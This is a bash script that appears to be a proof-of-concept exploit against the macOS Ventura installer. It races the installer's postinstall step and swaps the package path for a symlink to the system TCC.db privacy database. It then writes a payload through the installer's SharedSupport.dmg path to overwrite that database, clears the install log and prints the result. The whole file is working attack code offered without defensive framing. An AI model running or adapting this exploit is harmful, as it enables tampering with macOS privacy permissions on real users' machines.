#!/bin/bash

if [ $# -eq 0 ]; then
    echo "No arguments provided. Usage: $0 <PKG_PATH>"
    exit 1
fi

echo "[*] preparing the environment..."
TARGET_FILE="/Library/Application Support/com.apple.TCC/TCC.db"
PKG_PATH=$1
MOUNT_DIR="/"
PKG_NAME="${PKG_PATH##*/}"
PKG_TEMP_DIR="/tmp/$PKG_NAME"
PAYLOAD="Injected!"

if [ -e "/Applications/Install macOS Ventura.app/Contents/SharedSupport/SharedSupport.dmg" ]; then
    echo "[*] cleaning previous installation..."
    sudo rm -rf /Applications/Install macOS Ventura.app
fi

#sudo cp $PKG_PATH $PKG_TEMP_DIR
sudo cat /dev/null > /var/log/install.log

sudo echo "[*] all the preparations are done."
sudo installer -pkg $PKG_PATH -target $MOUNT_DIR &

echo "[*] waiting for installer..."
while true; do
    if tail -n 60 /var/log/install.log | grep -q 'Executing script "./postinstall.sh"'; then
        echo "[*] postinstall script executed"
        echo "[*] creating the symlink..."
        #sudo rm -rf "$PKG_PATH"
        sudo ln -sfn "$TARGET_FILE" "$PKG_PATH"
        if [ $? -eq 0 ]; then
            echo "[*] symlink [$PKG_PATH] -> [$TARGET_FILE] created successfully!"
        else
            echo "[-] failed to create symlink [$PKG_PATH] -> [$TARGET_FILE]"
        fi

        echo "[*] injecting payload on $TARGET_FILE"
        sudo echo "$PAYLOAD" > "/Applications/Install macOS Ventura.app/Contents/SharedSupport/SharedSupport.dmg"

        echo "[*] printing $TARGET_FILE"
        echo "----------------------------- $TARGET_FILE -----------------------------"
        sudo cat "$TARGET_FILE"
        echo "EOF"
        break
    else
        echo "[-] waiting for postinstall script to execute..."
    fi
done
echo "[*] all done. enjoy :P"